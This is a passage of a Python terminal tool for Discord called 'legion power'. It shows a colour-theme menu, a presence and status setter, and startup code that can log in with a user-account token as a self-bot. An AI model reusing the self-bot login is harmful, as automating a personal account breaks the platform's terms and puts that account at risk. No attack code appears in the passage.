      {self.color} \033[37m[{self.color}1\033[37m] \033[37mRed               {self.color}\033[37m [{self.color}5\033[37m] \033[37mPurple            {self.color}\033[37m [{self.color}9\033[37m] \033[37mGrey              {self.color}\033[37m
      {self.color} \033[37m[{self.color}2\033[37m] \033[37mGreen             {self.color}\033[37m [{self.color}6\033[37m] \033[37mBlue              {self.color}\033[37m [{self.color}0\033[37m] \033[37mPeach             {self.color}\033[37m
      {self.color} \033[37m[{self.color}3\033[37m] \033[37mYellow            {self.color}\033[37m [{self.color}7\033[37m] \033[37mPink              {self.color}\033[37m [{self.color}M\033[37m] \033[37mMenu              {self.color}\033[37m
      {self.color} \033[37m[{self.color}4\033[37m] \033[37mOrange            {self.color}\033[37m [{self.color}8\033[37m] \033[37mCyan              {self.color}\033[37m [{self.color}X\033[37m] \033[37mExit              {self.color}\033[37m
      {self.color}\033[37m
             
        \033[37m''')
        choice = input(f'{self.color}> \033[37mChoice{self.color}: \033[37m')

        if choice == '1' or choice == 'red' or choice == 'Red':
            self.color = '\x1b[38;5;196m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == '2' or choice == 'green' or choice == 'Green':
            self.color = '\x1b[38;5;34m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == '3' or choice == 'yellow' or choice == 'Yellow':
            self.color = '\x1b[38;5;142m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == '4' or choice == 'orange' or choice == 'Orange':
            self.color = '\x1b[38;5;172m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == '5' or choice == 'purple' or choice == 'Purple':
            self.color = '\x1b[38;5;56m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == '6' or choice == 'blue' or choice == 'Blue':
            self.color = '\x1b[38;5;21m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == '7' or choice == 'pink' or choice == 'Pink':
            self.color = '\x1b[38;5;201m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == '8' or choice == 'cyan' or choice == 'Cyan':
            self.color = '\x1b[38;5;51m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == '9' or choice == 'grey' or choice == 'gray' or choice == 'Gray' or choice == 'Grey':
            self.color = '\x1b[38;5;103m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == '0' or choice == 'peach' or choice == 'Peach':
            self.color = '\x1b[38;5;209m'
            os.system('clear')
            await self.ThemeChanger()
        elif choice == 'M' or choice == 'm' or choice == 'Menu' or choice == 'menu':
            os.system('clear')
            await self.Menu()
        elif choice == 'X' or choice == 'x' or choice == 'exit' or choice == 'Exit':
            _exit(0)
        else:
            print(f"{self.color}> \033[37mInvalid Input")
            sleep(1)
            os.system('clear')
            await self.ThemeChanger()

    def Startup(self):
        if token_type == "user":
            bot.run(token, bot=False)
        elif token_type == "bot":
            bot.run(token)
        else:
            print(f"{self.color}> \033[37mInvalid Token")
            _exit(3)
    
    async def SetStatus(self):
        system(f"cls & mode 110,20 & title legion power - Status")
        print(f'''
      {self.color}                        \033[38;5;196m ██▓    ▓█████   ▄████  ██▓ ▒█████   ███▄    █ 
      {self.color}                        \033[38;5;196m▓██▒    ▓█   ▀  ██▒ ▀█▒▓██▒▒██▒  ██▒ ██ ▀█   █
      {self.color}                        \033[90m▒██░    ▒███   ▒██░▄▄▄░▒██▒▒██░  ██▒▓██  ▀█ ██▒\033[90m
      {self.color}                        \033[90m▒██░    ▒▓█  ▄ ░▓█  ██▓░██░▒██   ██░▓██▒  ▐▌██▒\033[90m
      {self.color}                        \033[37m░██████▒░▒████▒░▒▓███▀▒░██░░ ████▓▒░▒██░   ▓██░\033[37m
      {self.color}                        \033[37m░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒\033[37m
                            
                            {self.color}[\033[37mSTATUS{self.color}]                {self.color}[\033[37mMODE{self.color}]
                            {self.color}[\033[37m1{self.color}] \033[37m Game               {self.color}[\033[37m1{self.color}] \033[37m Online
                            {self.color}[\033[37m2{self.color}] \033[37m Streaming          {self.color}[\033[37m2{self.color}] \033[37m DND
                            {self.color}[\033[37m3{self.color}] \033[37m Watching           {self.color}[\033[37m3{self.color}] \033[37m Idle
                            {self.color}[\033[37m4{self.color}] \033[37m Listening          {self.color}[\033[37m4{self.color}] \033[37m Invisible
                            {self.color}[\033[37m5{self.color}] \033[37m Menu               
                             
        \033[37m''')
        status_type = input(f"{self.color}> \033[37mChoice{self.color}: \033[37m")
          
            
        if status_type == '1' or status_type == '':
            mode = input(f'{self.color}> \033[37mMode{self.color}: \033[37m')
            status_message = input(f'{self.color}> \033[37mMessage{self.color}: \033[37m')
            if mode == '1' or mode == '':
                await bot.change_presence(activity=discord.Game(name=f"{status_message}"), status=discord.Status)
            elif mode == '2':
                await bot.change_presence(activity=discord.Game(name=f"{status_message}"), status=discord.Status.dnd)
            elif mode == '3':
                await bot.change_presence(activity=discord.Game(name=f"{status_message}"), status=discord.Status.idle)
            elif mode == '4':
                await bot.change_presence(activity=discord.Game(name=f"{status_message}"), status=discord.Status.invisible)
            else:
                pass

            print(f"\n{self.color}[\033[37m!{self.color}]\033[37m Set Status To{self.color} Playing {status_message}\033[37m")
            os.system('clear')
            await self.SetStatus()

        elif status_type == '2':
            status_name = input(f'{self.color}> \033[37mName{self.color}: \033[37m')
            status_url = input(f'{self.color}> \033[37mStream Url{self.color}: \033[37m')
            await bot.change_presence(activity=discord.Streaming(name=f"{status_name}", url= f"{status_url}"))
            print(f"\n{self.color}[\033[37m!{self.color}]\033[37m Set Status To{self.color} Streaming {status_name}\033[37m")
            os.system('clear')
            await self.SetStatus()
            
        elif status_type == '4':
            mode = input(f'{self.color}> \033[37mMode{self.color}: \033[37m')
            status_song = input(f'{self.color}> \033[37mSong{self.color}: \033[37m')
            if mode == '1' or mode == '':
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{status_song}"))
            elif mode == '2':
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{status_song}"), status=discord.Status.dnd)
            elif mode == '3':
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{status_song}"), status=discord.Status.idle)
            elif mode == '4':
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{status_song}"), status=discord.Status.invisible)
            else:
                pass
            print(f"\n{self.color}[\033[37m!{self.color}]\033[37m Set Status To{self.color} Listening to {status_song}\033[37m")
            os.system('clear')
            await self.SetStatus()
            
        elif status_type == '3':
            mode = input(f'{self.color}> \033[37mMode{self.color}: \033[37m')
            status_movie = input(f'{self.color}> \033[37mShow/Movie{self.color}: \033[37m')
            if mode == '1' or mode == '':
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{status_movie}"))
            elif mode == '2':
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{status_movie}"), status=discord.Status.dnd)
            elif mode == '3':
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{status_movie}"), status=discord.Status.idle)
            elif mode == '4':
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{status_movie}"), status=discord.Status.invisible)            
            else:
                pass
            print(f"\n{self.color}[\033[37m!{self.color}]\033[37m Set Status To{self.color} Watching {status_movie}\033[37m")
            os.system('clear')
            await self.SetStatus()
        
        elif status_type == '5':
            await self.Menu()
        
        else:
            pass

    @bot.event
    async def on_ready():
        if token_type == "bot":
            print(f"\x1b[38;5;51m> \033[37mLoading...\x1b[38;5;51m \033[37m")
            sleep(2)
            await legion().Menu()
        
        else:
            pass
    
    @bot.event
    async def on_connect():
        if token_type == "user":
            print(f"\x1b[38;5;51m> \033[37mLoading...\x1b[38;5;51m \033[37m")
            sleep(2)
            await legion().Menu()
        
        else:
            pass

        


if __name__ == "__main__":
    legion().Startup()
